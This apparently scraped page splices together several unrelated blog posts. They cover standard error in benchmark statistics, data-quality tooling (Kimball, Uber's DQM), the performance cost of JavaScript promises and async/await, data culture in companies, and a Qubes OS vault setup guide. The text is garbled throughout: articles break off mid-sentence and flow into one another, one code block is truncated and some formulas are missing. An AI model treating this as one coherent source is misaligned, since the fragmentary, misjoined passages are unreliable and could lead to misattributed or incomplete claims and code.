<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>s</mi><mo>^</mo></mover><mo>=</mo><msqrt><mrow><mfrac><mn>1</mn><mrow><mi>N</mi><mo>−</mo><mn>1</mn></mrow></mfrac><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>N</mi></munderover><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo>−</mo><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow></msqrt></mrow><annotation encoding="application/x-tex">\hat{s} = \sqrt{ \frac{1}{N - 1} \sum_{i = 1}^{N} (x_i - \bar{x})^2 }</annotation></semantics></math></span></span></span>

<span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mover accent="true"><mi>s</mi><mo>^</mo></mover><mover accent="true"><mi>X</mi><mo>ˉ</mo></mover></msub><mo>=</mo><mfrac><mover accent="true"><mi>s</mi><mo>^</mo></mover><msqrt><mi>N</mi></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\hat{s}_{\bar{X}} = \frac{\hat{s}}{\sqrt{N}}</annotation></semantics></math></span></span></span>

<p>where <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{x}</annotation></semantics></math></span></span> denotes the mean of the observations and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span></span> denotes the standard deviation from the mean. 
You don’t have to remember that formula nor code it manually, because probably every statistical library in most programming languages 
offers it out-of-the-box.</p>

<p>Why is the standard error such a useful metric? If we average a large enough number of observations, 
by <a href="https://en.wikipedia.org/wiki/Central_limit_theorem">the Central Limit Theorem</a>, 
the sample average <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>X</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{X}</annotation></semantics></math></span></span> will be distributed very closely to the normal distribution <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="script">N</mi><mo stretchy="false">(</mo><mi>μ</mi><mo separator="true">,</mo><msup><mi>σ</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\mathcal{N}(\mu, \sigma^2)</annotation></semantics></math></span></span> where

The really good news is that typically <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>10</mn></mrow><annotation encoding="application/x-tex">N = 10</annotation></semantics></math></span></span> is already 
“large enough” and also the distribution of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span> doesn’t need to be normal – it is enough it has finite mean and variance. 
BTW: If your benchmark results have infinite variance, then you may have a bigger problem than calculating the error of the mean.</p>

<p>This conclusion allows us to obtain confidence intervals for <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mover accent="true"><mi>x</mi><mo>ˉ</mo></mover></mrow><annotation encoding="application/x-tex">\bar{x}</annotation></semantics></math></span></span>:</p>

<p>The normal distributuion probability function is another nice thing that’s available in most statistical libraries, so
you could compute custom confidence intervals for any probability you wish easily.</p>


<p>Computing has this nice property that, unlike in biology, geography, medical or social sciences, it makes it easy and cheap to 
obtain huge samples. Every quadrupling of the sample size makes the confidence interval twice narrower for the same probability,
because there is <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>N</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{N}</annotation></semantics></math></span></span> in the denominator of the formula for the standard error, and the enumerator depends only on the distribution
of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span>, but not the number of observations. So, theoretically, we could estimate the expected value with any 
accuracy we wish, and we’re only limited by the time we’re allowed to run the test.</p>

<p>Let’s take for example, that we want to compute the average response time of the server. 
We issue <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> requests and calculate their mean. The local single node Casssandra server installed
on my development laptop can easily handle ~180k requests per second. Whoa! This makes my <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>180000</mn></mrow><annotation encoding="application/x-tex">N = 180000</annotation></semantics></math></span></span> for a benchmark that takes only a single second.
I can easily collect 1 million data points in less than 10 seconds. 1 million data points 
should make the error of the average response time estimate very small.</p>

<p>Indeed, with 99.9% confidence interval and <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">N = 1</annotation></semantics></math></span></span> million, I obtained a result like this:</p>

<pre>Avg response time: 2.45 ± 0.01 ms
</pre>

<p>What a lovely tiny error!
If it takes only a few seconds, why not run it a few more times to make really sure the result is correct?</p>

<pre>Avg response time: 2.51 ± 0.01 ms
Avg response time: 2.48 ± 0.01 ms
Avg response time: 2.57 ± 0.01 ms
Avg response time: 2.42 ± 0.01 ms
Avg response time: 2.47 ± 0.01 ms
</pre>

<p>Wait… did I say <strong>99.9%</strong> confidence interval? 
Why are my numbers fluctuating so much?! The differences definitely exceed the error interval.</p>

<p>After double checking the implementation and running more tests to verify I’m not just getting those ugly results by an extreme unlikely bad luck, 
I found that…</p>


<p>There is a nice joke about biologists and statisticians going to a conference by train.</p>

<blockquote>
  <p>3 biologists and 3 statisticians were going to a scientific conference in the same car compartment.
The biologists talk about how lucky they were to get a 5% discount on their train tickets. 
The statisticians responded: “We’ve paid even less – we’ve bought only one ticket for all three of us!”<br>
“How so?” – the biologists got confused. “You’ll see”. 
When the statisticians notice the ticket controller appear in the car, all of them quickly go
to a lavatory and close the door. When the controller sees the lavatory is occupied, he knocks 
on the door, the statisticians give him the (single) ticket through a small gap below the door.
Biologists are amazed seeing this.</p>

  <p>After the conference, the biologists buy only one ticket
for the return home and want to use the statisticians’ method. 
They meet with the same 3 statisticians in the compartment and 
tell them their plan. The statisticians respond: “Well, that’s a nice idea, but we’ve already 
improved our method. See, this time we’ve bought no tickets at all!”. “How so?!”. “You’ll see”.
When the controller appears, the biologists rush to the lavatory. The statisticians follow them
and knock on the door. The biologists give the ticket they’ve bought, the statisticians take it
and lock themselves in another lavatory. 
The conclusion: don’t use statistical methods you don’t understand!</p>

              <p><img src="https://www.holistics.io/blog/content/images/2020/05/data_quality_people_process_tools.jpg" alt="Data Quality from First Principles"></p><section>
              <p>If you’ve spent any amount of time in business intelligence, you would know that data quality is a perennial challenge. It never really goes away.</p><p>For instance, how many times have you been in a meeting, and find that someone has to vouch for the numbers being presented?</p><p>“These reports show that we’re falling behind competitor X,” someone might say, and then gets interrupted —</p><p>“How do you know these numbers are right?”</p><p>“Well, I got them from Dave in the data team.”</p><p>“And you trust him?”</p><p>“We went through the numbers together. I can vouch for these numbers.”</p><p>“Alright, carry on.”</p><p>The conversation in itself tells you something about the relationship the organization has with data. It tells you that perhaps data quality problems have plagued management in recent months.</p><p>Nobody wants to make decisions with bad data. And nobody wants to look stupid. So for as long as people use data in the workplace, trusting the quality of your data will always be a background concern.</p><p>Which in turn means that it’s going to be <em>your</em> concern.</p><p>There’s this old nut in business circles that goes: “people first, process second, and tools third”, sometimes known as “People Process Tools”, or ‘PPT’. One take on that saying is that if you have a group of well-trained, high quality people, you don’t need to have rigid processes. If you can’t expect people to be great 100% of the time, then you have to introduce some amount of process. And if you’ve tried your best with people and process, then you have to think about augmenting both with tools or technology.</p><p>(The other way of looking at this is that if you have terrible tools, work still gets done; if you have terrible processes, good people can still figure out a way around the bureaucracy, but if you have terrible people, all hope is lost.)</p><p><strong>Data quality is a PPT problem.</strong> This is actually the consensus view in the industry, and should not be surprising to most of us. Here’s Snowplow, for instance, in their <a href="https://snowplowanalytics.com/lp/data-quality/">whitepaper on data quality</a>:</p><blockquote>We won’t lie - measuring the accuracy and completeness of your data is not easy and is a process rather than a project. It starts at the very beginning: how you collect your data. And while it never ends, quality grows with better-defined events going into your pipeline, data validation, surfacing quality issues and testing.</blockquote><p>And here’s data warehousing legend <a href="https://en.wikipedia.org/wiki/Ralph_Kimball">Ralph Kimball</a>, in a <a href="https://www.kimballgroup.com/2007/10/white-paper-an-architecture-for-data-quality/">white paper</a> he published back in 2007:</p><blockquote>It is tempting to blame the original source of data for any and all errors that appear downstream. If only &nbsp;the data entry clerk were more careful, and REALLY cared! We are only slightly more forgiving of typing-challenged salespeople who enter customer and product information into their order forms. Perhaps we can fix data quality problems by imposing better constraints on the data entry user interfaces. This approach provides a hint of how to think about fixing data quality, but we must <strong>take a much larger view before pouncing on technical solutions</strong> <em>(emphasis added)</em>.<p>(…)</p><p>Michael Hammer, in his revolutionary book <em>Reengineering the Corporation</em> (HarperBusiness 1994), struck to the heart of the data quality problem with a brilliant insight that I have carried with me throughout my career. Paraphrasing Hammer: “Seemingly small data quality issues are, in reality, important indications of broken business processes.” Not only does this insight correctly focus our attention on the source of data quality problems, but it shows us the way to the solution. </p><p>(…) <strong>Technical attempts to address data quality will not function unless they are part of an overall quality culture that must come from the very top of an organization</strong> <em>(emphasis added)</em>.</p></blockquote><p>But common sense dictates that while tools can only succeed with the right people culture and processes in place, tools <em>will</em> influence what can be done, and by whom.</p><p>Kimball’s whitepaper is useful because he outlines a common-sense, first principles approach to thinking about tools for data quality.</p><p>In his view, tools that promote good data quality should come with the following features:</p><ul><li>They should <strong>enable early diagnosis and triage</strong> of data quality issues. Ideally, you should be notified the instant some number seems off.</li><li>Tools should <strong>place demands on source systems and integration efforts to supply better data</strong>. Integrating with the tool should force data teams to reckon with a certain baseline of expected quality.</li><li>They should provide users with <strong>specific descriptions of data errors</strong> when encountered during ETL. This is a tool-specific requirement, and it applies to both ETL and ELT-paradigm tools.</li><li>There should be a <strong>framework for capturing <em>all</em> data quality errors</strong>. That is, data quality errors should be treated as a source of data itself, which means that:</li><li>There should be a <strong>method for measuring data quality over time</strong>. And finally:</li><li><strong>Quality confidence metrics</strong> should be attached to final data.</li></ul><p>If you’re wondering what a quality confidence metric is, you’re not alone. In the whitepaper, Kimball goes to great lengths to define quality confidence metrics as a statistical measure of expected value. For instance, if we are tracking data in 600 stores with 30 departments each, we should expect to receive 18,000 sales numbers each day. Kimball explains that all numbers that are three standard deviations above the historical mean could be logged into a separate error table. The data team should then take responsibility for investigating every event that is logged there.</p><p>(Kimball being Kimball, he describes the error table as a fact table in a dimensional star schema … <em>because of course he would</em>).</p><p>Are there more modern approaches to data quality? Yes there are. In a blog post a couple of weeks ago, Uber released details of their <a href="https://eng.uber.com/monitoring-data-quality-at-scale/">data quality monitoring system</a> (which they’ve named DQM), which uses similar statistical modeling techniques to guarantee data quality at scale.</p><figure><img src="https://www.holistics.io/blog/content/images/2020/05/image-8.png" alt=""><figcaption>DQM from Uber</figcaption></figure><p>DQM is essentially a more sophisticated version of the same approach. It observes data tables and generates a multi-dimensional time series for each. For numeric data, DQM tracks metrics like average, median, maximum, and minimum. For string data, DQM tracks the number of unique values and the number of missing values in the strings they’re monitoring. On normal days, DQM spits out a quality score for each table, for display to data table users. But if DQM observes data that is abnormal compared to the historical patterns, it alerts all downstream reports and dashboards and warns both data consumers as well as data engineers to mistrust the numbers, and to check source systems for the potential problems.</p><p>I won’t summarise Uber’s <a href="https://eng.uber.com/monitoring-data-quality-at-scale/">blog post</a>, because it does a great job of explaining the technical details in a concise, useful manner. But I couldn’t help but notice that Uber’s system fulfils all the requirements set out in Kimball’s original whitepaper.</p><p>To wit:</p><ul><li>DQM <strong><strong>enable</strong>s<strong> early diagnosis and triage</strong></strong> of data quality issues.</li><li>DQM sits on top of all other data infrastructure, thus <strong><strong>plac</strong>ing<strong> demands on source systems and integration efforts to supply better data</strong></strong>. </li><li>DQM stores <strong><strong>specific descriptions of data errors</strong></strong> that are encountered at any point in the data lifecycle.</li><li>It <strong>captures<strong> <em><em>all</em></em> data quality errors</strong></strong>. </li><li>It generates time series data, which means that stored data quality scores are an easy way to <strong>measure<strong> data quality over time</strong></strong>. And finally:</li><li><strong><strong>Quality confidence metrics</strong></strong> are <em>always</em> displayed alongside actual data.</li></ul><p>DQM may be proprietary to Uber, but the approach is pretty darned inspirational to the rest of us in the industry. Which was probably what the authors intended with their blog post.</p><p>If you’re struggling with data quality at your company, take a step back to see if you can address your problems with <strong>tools</strong> or <strong>processes</strong> that feature even a handful of Kimball’s suggested principles. Don’t fret if you fail; data quality is an ongoing concern … which implies you <em>won’t</em> get it right all at once. You merely have to make sure you’re getting better at quality over time.</p>

<p>JavaScript as a language is heavily asynchronous, with promises being deeply integrated. The inclusion of async/await syntax has massively improved this, making asynchronous code much more readable. Being able to mark methods as async makes it much easier to integrate into existing parts of code, sometimes causing large chains of method calls to become async for a single deep method call. While this is sometimes the best solution, can the overhead of promises pose a problem for hot code?</p>
<h3 id="benchmarks"><a href="#benchmarks" aria-label="benchmarks permalink"></a>Benchmarks</h3>
<p>As of writing, the v8 JavaScript engine that powers both Chromium and NodeJS does not optimise out redundant promises. Due to this, a decent benchmark to determine just the overhead of promises is to take a typical function call and make it a promise. For this case, I'm using a function that calculates a position in the Fibonacci sequence.</p>
<h4 id="test-1---recursive-fibonacci"><a href="#test-1---recursive-fibonacci" aria-label="test 1   recursive fibonacci permalink"></a>Test 1 - Recursive Fibonacci</h4>
<p>The first test is using a recursive Fibonacci function. Using a recursive function as a test case here means we will get a compounding overhead from the promises. This result will show us a relatively worse case example.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span> <span>+</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>num <span>&lt;=</span> <span>1</span><span>)</span> <span>return</span> <span>1</span><span>;</span>
  <span>return</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>1</span><span>)</span><span>)</span> <span>+</span> <span>(</span><span>await</span> <span>fibonacci</span><span>(</span>num <span>-</span> <span>2</span><span>)</span><span>)</span><span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>10</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  
  
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/jrkj8dqar8/1">JSBench.Me</a>, the promise case is shown to be <strong>86% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>While this is an unrealistic case, it shows that promises can significantly impact performance, especially in hot code paths.</p>
<h4 id="test-2---non-recursive-fibonacci"><a href="#test-2---non-recursive-fibonacci" aria-label="test 2   non recursive fibonacci permalink"></a>Test 2 - Non-Recursive Fibonacci</h4>
<p>A non-recursive Fibonacci sequence shows what sort of overhead a low-cost method call could have to get a more real-world view. In this case, each call to the function will only have the overhead of a single promise.</p>
<p>The following code has been used,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>;</span>
<span>}</span></code></pre></div>
<div data-language="javascript"><pre><code>
<span>async</span> <span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>
  <span>var</span> a <span>=</span> <span>1</span><span>,</span>
    b <span>=</span> <span>0</span><span>,</span>
    temp<span>;</span>
  <span>while</span> <span>(</span>num <span>&gt;=</span> <span>0</span><span>)</span> <span>{</span>
    temp <span>=</span> a<span>;</span>
    a <span>=</span> a <span>+</span> b<span>;</span>
    b <span>=</span> temp<span>;</span>
    num<span>--</span><span>;</span>
  <span>}</span>
  <span>return</span> b<span>;</span>
<span>}</span>
<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>;</span> i <span>&lt;</span> <span>100</span><span>;</span> i<span>++</span><span>)</span> <span>{</span>
  <span>fibonacci</span><span>(</span>i<span>)</span><span>.</span><span>then</span><span>(</span><span>(</span><span>)</span> <span>=&gt;</span> <span>{</span><span>}</span><span>)</span><span>;</span>
<span>}</span></code></pre></div>
<p>When running this on <a href="https://jsbench.me/1dkj8e6n54/1">JSBench.Me</a>, the promise case is shown to be <strong>81% slower</strong> on Chrome 87 than the non-promise case.</p>
<p>This result shows that adding an async modifier to the method can almost double the time it takes to execute simple functions. For hot code, this could make a significant difference.</p>
<h4 id="test-3---promise-vs-asyncawait"><a href="#test-3---promise-vs-asyncawait" aria-label="test 3   promise vs asyncawait permalink"></a>Test 3 - Promise vs Async/Await</h4>
<p>So we've seen what just adding the async keyword can do, but what if we use promises directly instead?</p>
<p>Using async code from the previous test case, and the following code,</p>
<div data-language="javascript"><pre><code>
<span>function</span> <span>fibonacci</span><span>(</span><span>num</span><span>)</span> <span>{</span>

<p>When running this on <a href="https://jsbench.me/3jkj8ekl0r/1">JSBench.Me</a>, the case using promises rather than async/await is shown to be a further <strong>26% slower</strong> on Chrome 87 than the async/await case.</p>
<h3 id="solutions"><a href="#solutions" aria-label="solutions permalink"></a>Solutions</h3>
<p>There are a few potential solutions for this issue. Firstly, however, it's important to point out that unless you've confirmed a section of code to be causing performance issues, you don't need to optimise it. Once you've used a profiler to verify that it's worth optimising a piece of code, then it's worth investigating.</p>
<p>The simplest solution here is to perform data fetching or other asynchronous operations closer to the application's root and pass the resulting data down. Often program structures that involve deep-nested async/await paths exhibit poor separation of concerns. Ideally, a single system should not load and use data; instead, it should receive the data from another system that loads it. This structure also has the added benefit of being much more testable. Doing this should prevent the need to nest async/await methods deeply.</p>
<p>Another option is to only use the async keyword for the inner-most method if possible. Each method with an async keyword adds overhead, so if you can work with the promise directly outside of that function, you're not introducing further overhead. This technique can be even more helpful when the method only sometimes needs to return a promise. In this case, including the async keyword introduces the overhead always. If you return a promise directly, overhead (albeit slightly more overhead) happens only a portion of the time.</p>
<h3 id="conclusion"><a href="#conclusion" aria-label="conclusion permalink"></a>Conclusion</h3>
<p>Promises and Async/Await introduce measurable overhead into JavaScript code. This problem can be worked around in most cases when necessary, yet, it will not pose any issue most of the time. As with most things, understanding the various trade-offs in performance is essential when optimising code. If you've identified a hot code path that makes heavy use of async/await, it may be worth investigating ways to minimise that.</p></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>In the modern business environment everyone wants to be data-driven. You can hear the envy in a conference room when a good graph hits the audience right in their data-loving brains. Data is good. Data rules all.</p>

<p>What you see less are the glaring imperfections in most data. The show must go on - fine-grained analysis of the data used for strategic decisions holds up things up. Deep dives into data require ability to get that data, interpret that data, and understand that data. This creates a power imbalance where the data-creator is much better positioned to tell the story they want to tell; the data-consumer is hard-pressed to disagree with that story in real-time. Alas, decisions happen in conference rooms, data analysis happens at a desk.</p>

<p>These two realities are Saasy’s Axioms of Data:</p>
<ul>
  <li>Data wins arguments. Imperfect data beats no data.</li>
  <li>All data is imperfect.</li>
</ul>

<p>These realities have 3 major implications for how you should approach getting things done:</p>
<ul>
  <li>Show up with data.</li>
  <li>Use data as a compass, not a map.</li>
  <li>Beware the abuse of data.</li>
</ul>

<h2 id="show-up-with-data">Show Up With Data</h2>

<p>Most of the time some data is better than no data. You should strive to be data-driven. Our collective admiration of data comes from a reasonable instinct.</p>

<p>In a world where data is useful and people view it as a sign of mature, rational, and thorough work, you should show up with data. No matter your role, you will get more of the things you want and do a better job if you show up with data.</p>

<p>As many have pointed out, you can measure anything to get data for your case:</p>
<ul>
  <li>Our team cycle time decreased by 20% last half on repos that were converted to using React and remained constant on ones that weren’t. We should convert the remainder of our repos to React.</li>
  <li>We left 290 style comments on pull requests in the last quarter. If each of those take 2 minutes to resolve on average, replacing that mechanism with an automatic enforced style-guide will save us a full day per quarter.</li>
  <li>Only 5% of IT requests take longer than 1 week, but those that do take an average 3 months. Those tickets also are responsible for the majority of internal-NPS for the IT team below a 4. We need to implement a process to get rid of these outliers.</li>
</ul>

<p>All of these arguments are more compelling because they are data-supported. The data is imperfect, but it’s useful. It gives an overall, high-level assessment of the situation. It also allows for measurement of results, using the same data after the change.</p>

<p>If you’re not using data regularly you’re probably leaving a lot of impact on the floor, no matter if you’re a new IC right out of college or a seasoned executive. Show up with data.</p>

<h2 id="data-is-a-compass-not-a-map">Data Is A Compass, Not A Map</h2>

<p>Data exists to help you understand, at a high level, what would be useful to do and how effective your actions have been. However, the more granular the decisions are, the less useful data becomes. Data’s utility is strongest when it tells a clear story, not when it whispers details. So you should use data more when the data is very clear and makes sense, and you should rely on it less when it’s more nuanced.</p>

<p>For example, employee satisfaction surveys provide useful data when the signal is clear and blunt: people are unhappy or people are happy. The surveys are less useful when it comes to specific feedback. A sole comment about the espresso machine might say that it’s too loud. If you then move the machine to the hallway, you might find that 90% of your team hates the new location because it’s farther away. You used the data like a set of instructions, not a broad picture.</p>

<p>Another example: I had a feeling awhile back that remote candidates were turning down our offers more than local candidates. I pulled the data and the story was clear - remote candidates actually closed at a significantly higher rate than local candidates. The data was imperfect, but it gave no credence to my assumption, and I had other ways I can improve recruiting so I moved on.</p>

<p>In the compass analogy: I thought I was heading South, but my compass told me I was heading North. I might have actually been going NorthWest, but I’m happy enough to know that I’m not going South.</p>

<p>You might think that the advocacy to use data when it’s bold and intuitive is a catch-22, that data is most useful when it’s counter to your intuition and changes your behavior. However, I disagree - data is most often important in two cases: 1) it provides direction when you have no prior intuition at all and 2) it sets you up to measure the success of your work from the get-go.</p>

<h2 id="beware-the-abuse-of-data">Beware The Abuse Of Data</h2>

<p>Because data is powerful and imperfect, and because decisions are using presented data and not data-analysis, there are many who would wield its power without prudence. You can see these people show up with hand-crafted data any time they want to get their way. And because it can seem petty and defensive to question that data - after all, you’d be the amateur who didn’t show up with data - those people can often get their way, even when the data isn’t bold and the conclusions are debatable.</p>

<p>There’s no one-size-fits-all solution to these situations. High level though, I’d recommend the following:</p>
<ul>
  <li>Work to ensure your company has a healthy data culture</li>
  <li>Show up with data for the things you really care about</li>
</ul>

<p>First, a healthy data culture uses data but understands its limitations. A healthy data culture is a humble data culture. If data is moving you towards good decisions with clear signals and helps you measure success, that’s great. If data is wielded as a weapon or is paraded around as a sign of greatness, watch out.</p>

<p>For an example of a bad data culture, your no-assholes-allowed company might put up with a salesperson because “they put up crazy numbers”. Indeed, that person might wear their quarterly numbers like a badge that lets them behave on a different plane of existence. However, are you tracking how often they are making concessions with negative downstream impacts? Are you tracking how much time they take from the rest of the organization to support their sales? This is to say nothing of the culture impact of that person.</p>

<p>The nuance here is important. Their quarterly numbers tell a clear story - they sell a lot of product. But the question was more nuanced: should we put up with their behavior? In reality, you likely have almost no data that quantifies the totality of their impact on the company. Their sales are just one number in a complex ecosystem.</p>

<p>In this example, you used imperfect data to let you do something you wouldn’t otherwise. You made data a king and ended up being ruled by a tyrant.</p>

<p>Second, if you really care about something, considering showing up with data. Otherwise, you’ll be at a disadvantage if someone else does.</p>

<h2 id="summary">Summary</h2>

<p>Data, like any power, should be wielded with respect, humility, and caution. However, unlike most power, you should be wielding it regularly.</p>

<h2 id="isolated-place">Isolated place</h2>

<p>When working on R.I.S.K.S. be sure to be in a peaceful and isolated environment so that you can work with calm and reasonably sure that none is watching.</p>

<h2 id="paper-password">Paper password</h2>

<p>Writing down passphrases on paper is usually not a good idea but I believe it’s still good until there is a better place where to store them.</p>

<p>At least it prevents the worst risk: being locked out.</p>

<p>I have the habit of creating passphrases before starting the encryption process and I write them down on what I call <em>password paper</em>.</p>

<p>I memorize the passphrases by repeating them by heart hundreds times until I feel confident that I won’t forget them.</p>

<p>I mentally repeat my passwords on daily basis even if I’m not using my devices. It has become a traffic-light habit.</p>

<p>Soon I’ll need:</p>

<ul>
  <li>a passphrase for Qubes OS filesystem</li>
  <li>a passphrase for the sdcard</li>
  <li>a passphrase for Joe’s GPG</li>
  <li>a master password for <code>mpw</code></li>
  <li>a password for the Qubes user</li>
</ul>

<p>Each passphrase and password must be different.</p>

<p>Each passphrase and password difficulty must be calibrated accordingly to the environmental risk.</p>

<p>For example the difficulty of the Qubes user’s password depends on the chances to have someone hacking the pc meanwhile it’s locked with the screensaver.</p>

<p>This is an example of how my <em>password paper</em> looks like.</p>

<p><strong>MUST BE REMEMBERED</strong></p>

<p>When I’m done with the software configuration I destroy the password paper by shredding it and flushing it down the toilet.</p>



<p>Follow these steps:</p>

<ol>
  <li>find a pc that you can use just for Qubes OS. Don’t use Qubes OS in dual boot with another operating system.</li>
  <li>if you can’t afford another pc just buy a small SSD drive (avoid mechanic hard drives mostly because of low speed) and plug it inside your current pc.</li>
  <li><a href="https://www.qubes-os.org/downloads/">download Qubes OS R4.0</a> and burn the Qubes OS iso on dvd or <a href="https://www.qubes-os.org/doc/installation-guide/">dd-copy</a> it on a usb hard-drive or pen-drive</li>
  <li>follow step by step the <a href="https://www.qubes-os.org/getting-started/">official Qubes OS guide</a> and install Qubes OS on your pc. No need to look around for third parties tutorials.</li>
  <li>spend a few days/weeks on Qubes OS until you understand its basics</li>
  <li>learn how to create Debian 9 based templates following these <a href="https://www.qubes-os.org/doc/templates/debian/">instructions</a></li>
  <li>learn how to create Debian 10 based templates</li>
  <li>learn how to create standaloneVMs and AppVMs based on Debian 9 and 10. Juggle with this a little.</li>
</ol>

<blockquote>
  <p>Be sure to use a good diceware passphrase for Qubes OS filesystem. It’s asked during Qubes installation process.</p>
</blockquote>

<p>From now I assume that all this has been done.</p>



<p>The <em>vault</em> qube handles secrets, passwords and GPG.</p>

<p>My <em>vault</em> is a standalone network-less qube created from an official Qubes OS Debian 9 image from which I remove the unneeded software.</p>

<blockquote>
  <p>If you don’t like Debian you can use your preferred Linux distribution but you need to adjust R.I.S.K.S. instructions accordingly.</p>
</blockquote>

<p>No need to create the <em>vault</em> as AppVM because there is just one <em>vault</em> serving all the identities.</p>

<p>It uses only one CPU and it has memory balancing. The initial memory is 180MB and the max is 512MB. Max storage size: 2048MiB.</p>

<p>All these parameters can be adjusted from <em>Qube Manager</em>.</p>

<p>I left the file <code>vault_packages.txt</code> in <em>risks-scripts</em> for a list of suggested packages for <em>vault</em>.</p>

<h2 id="network-less-vault--updates-proxy">Network-less vault &amp; Updates Proxy</h2>

<p><em>vault</em> is a network-less qube so, from dom0 terminal:</p>

<div><div><pre><code>qvm-prefs vault netvm none
</code></pre></div></div>

<p>Because it’s a StandaloneVM, it won’t even get access by default to the <em><a href="https://www.qubes-os.org/doc/software-update-vm/#updates-proxy">Qubes Updates Proxy</a></em>.</p>

<p>To solve this problem I proceed as follow:</p>

<p>In dom0 terminal, I add a tag to <em>vault</em></p>

<div><div><pre><code>qvm-tags vault add standaloneVM
</code></pre></div></div>

<p>Tags can be listed with this command:</p>



<p>A tag identifies a group of qubes. Then I edit <code>vim /etc/qubes-rpc/policy/qubes.UpdatesProxy</code> in this way:</p>

<div><div><pre><code><span># Upgrade Whonix TemplateVMs through sys-whonix.</span>
<span>$tag</span>:whonix-updatevm <span>$default</span> allow,target<span>=</span>sys-whonix
<span># Deny Whonix TemplateVMs using UpdatesProxy of any other VM.</span>
<span>$tag</span>:whonix-updatevm <span>$anyvm</span> deny

<span># Upgrade all StandaloneVm tagged as standaloneVM through sys-net</span>
<span>$tag</span>:standaloneVM <span>$default</span> allow,target<span>=</span>sys-net
<span># Deny StandaloneVMs tagged as standaloneVM using UpdatesProxy of any other VM.</span>
<span>$tag</span>:standaloneVM <span>$anyvm</span> deny

<span># Default rule for all TemplateVMs - direct the connection to sys-net</span>
<span>$type</span>:TemplateVM <span>$default</span> allow,target<span>=</span>sys-net
<span>$type</span>:TemplateVM <span>$anyvm</span> deny

<span>$anyvm</span> <span>$anyvm</span> deny
</code></pre></div></div>

<p>The two lines in the middle of the configuration file are giving access to any qube tagged as <em>standaloneVM</em> to the <em>sys-net</em> qube where <em>Qubes updates proxy</em> runs by default.</p>

